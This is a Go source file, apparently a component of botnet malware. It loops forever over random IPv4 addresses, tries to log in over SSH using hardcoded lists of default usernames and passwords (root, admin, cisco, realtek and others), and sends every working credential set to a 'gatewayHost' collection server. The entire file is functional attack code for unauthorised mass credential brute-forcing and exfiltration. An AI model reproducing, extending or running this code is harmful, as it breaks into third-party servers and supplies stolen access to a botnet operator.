package main

import (
	"fmt"
	"math/rand"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
)

// sshCrackRoutine is an infinite loop of cracking SSH service.
func sshCrackRoutine() {
	for {
		address := ipRandomAddress()
		user := randomSshUser()
		pass := randomSshPass()
		err := sshCheck(address, user, pass, 22)
		if err != nil {
			fmt.Println(err)
			continue
		}
		// Temp hardcoded.
		err = submitCreds(gatewayHost, Creds{
			Ip:   address,
			Port: 22,
			User: user,
			Pass: pass,
		})
		if err != nil {
			fmt.Println(err)
			continue
		}
	}
}

// ipChunk returns a string composed of numbers between 1 - 255.
func ipChunk() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Intn(253) + 1)
}

// ipRandomAddress returns a random IP address.
func ipRandomAddress() string {
	return ipChunk() + "." + ipChunk() + "." + ipChunk() + "." + ipChunk()
}

// sshCheck returns nil if the credentials are correct.
func sshCheck(ip, user, pass string, port int) error {
	_, err := ssh.Dial("tcp", ip+":"+strconv.Itoa(port), &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Second * 2,
	})
	if err != nil {
		return err
	}

	return nil
}

// randomSshUser returns a random username from sshUserList.
func randomSshUser() string {
	rand.Seed(time.Now().UnixNano())
	return sshUserList[rand.Intn(len(sshUserList))]
}

// randomSshPass returns a random password from sshPassList.
func randomSshPass() string {
	rand.Seed(time.Now().UnixNano())
	return sshPassList[rand.Intn(len(sshPassList))]
}

var sshUserList = []string{
	"telekom",
	"default",
	"linux",
	"unix",
	"admin",
	"administrator",
	"service",
	"security",
	"guest",
	"system",
	"supervisor",
	"superuser",
	"cisco",
	"realtek",
	"root",
}

var sshPassList = []string{
	"telekom",
	"nopassword",
	"securepassword",
	"default",
	"pass",
	"linux",
	"unix",
	"admin",
	"admin1",
	"admin12",
	"admin123",
	"admin1234",
	"admin12345",
	"admin123456",
	"admin1234567",
	"admin12345678",
	"admin123456789",
	"administrator",
	"1234",
	"12345",
	"123456",
	"1234567",
	"12345678",
	"123456789",
	"toor",
	"realtek",
	"password123",
	"service",
	"security",
	"guest",
	"pass",
	"system",
	"supervisor",
	"superuser",
	"cisco",
	"password",
	"root",
}
